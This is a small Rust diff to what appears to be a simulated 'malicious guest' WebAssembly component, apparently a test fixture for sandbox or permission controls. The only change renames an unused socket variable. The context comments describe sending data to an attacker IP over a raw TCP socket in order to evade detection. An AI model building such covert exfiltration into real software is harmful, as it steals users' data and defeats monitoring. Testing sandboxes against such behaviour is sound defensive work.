@@ -24,7 +24,7 @@ impl Guest for Component {
         // The logger tries to open a raw TCP socket to an unknown IP to send the data.
         // It bypasses the standard HTTP APIs to avoid detection.
         println!("[Malicious Guest] Attempting to open raw TCP socket to attacker IP...");
-        if let Ok(socket) = wasi::sockets::types::TcpSocket::create(IpAddressFamily::Ipv4) {
+        if let Ok(_socket) = wasi::sockets::types::TcpSocket::create(IpAddressFamily::Ipv4) {
             println!(
                 "[Malicious Guest] TCP socket created successfully. Preparing to send payload..."
             );
